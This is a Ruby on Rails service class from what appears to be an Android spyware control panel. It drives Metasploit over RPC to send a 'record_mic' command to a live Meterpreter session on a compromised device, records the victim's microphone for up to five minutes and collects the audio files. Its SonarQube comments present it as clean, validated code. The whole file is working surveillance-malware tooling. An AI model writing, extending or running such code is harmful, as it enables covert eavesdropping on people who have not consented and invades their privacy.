# frozen_string_literal: true

# SonarQube Rules Applied:
# - S2068: No hardcoded credentials - uses CredentialsService
# - S108: Proper error handling
# - S1192: DRY - no duplicated strings
class AudioRecorderService
  include MsfInstrumentation::ApplicationControllerMixin

  class RecordingError < StandardError; end

  SHARED_MSF_PATH = '/root/files/dumps/microphone_recs'
  SHARED_RAILS_PATH = '/app/android-spyware/files/dumps/microphone_recs'

  # SonarQube: Validate duration range
  MIN_DURATION = 1
  MAX_DURATION = 300 # 5 minutes max

  def initialize(session_id)
    @session_id = validate_session_id(session_id)
    @msf_service = MsfRpcService.new
  end

  def record(duration: 10)
    validated_duration = validate_duration(duration)
    setup_directories
    
    filename = generate_filename
    msf_file_path = "#{SHARED_MSF_PATH}/#{filename}"
    rails_file_path = "#{SHARED_RAILS_PATH}/#{filename}"

    Rails.logger.info("🎙️ Starting recording for #{validated_duration}s on session #{@session_id}")
    Rails.logger.info("📂 Target Path: #{msf_file_path}")

    SpywareTracing.trace_msf_operation('record_mic', { session_id: @session_id, duration: validated_duration }) do |span|
      perform_recording(span, validated_duration, msf_file_path, rails_file_path, filename)
    end
  end

  private

  def perform_recording(span, duration, msf_path, rails_path, filename)
    # SonarQube S2076: Safe command - duration is validated integer
    @msf_service.connect
    response = @msf_service.instance_variable_get(:@rpc).call(
      'session.meterpreter_write', 
      @session_id, 
      "record_mic -d #{duration} -f #{msf_path}"
    )
    
    # Wait for recording + buffer
    sleep(duration + 2)
    
    if File.exist?(rails_path)
      span.set_attribute('recording.status', 'success')
      span.set_attribute('recording.size', File.size(rails_path))
      { success: true, path: rails_path, filename: filename }
    else
      span.set_attribute('recording.status', 'failed_file_missing')
      { success: false, error: "File not found at #{rails_path}" }
    end
  rescue MsfRpcService::ConnectionError, MsfRpcService::SessionError => e
    SpywareTracing.record_error(span, e, 'record_mic')
    Rails.logger.error("❌ Audio recording failed: #{e.message}")
    { success: false, error: e.message }
  rescue StandardError => e
    SpywareTracing.record_error(span, e, 'record_mic')
    Rails.logger.error("❌ Audio recording failed: #{e.message}")
    { success: false, error: e.message }
  end

  def setup_directories
    FileUtils.mkdir_p(SHARED_RAILS_PATH) unless Dir.exist?(SHARED_RAILS_PATH)
  end

  # SonarQube: Input validation
  def validate_session_id(session_id)
    sid = session_id.to_s
    raise RecordingError, "Invalid session ID" unless sid =~ /\A\d+\z/
    sid
  end

  def validate_duration(duration)
    dur = duration.to_i
    dur = MIN_DURATION if dur < MIN_DURATION
    dur = MAX_DURATION if dur > MAX_DURATION
    dur
  end

  def generate_filename
    "audio_#{Time.now.strftime('%Y%m%d_%H%M%S')}_#{@session_id}.wav"
  end
end
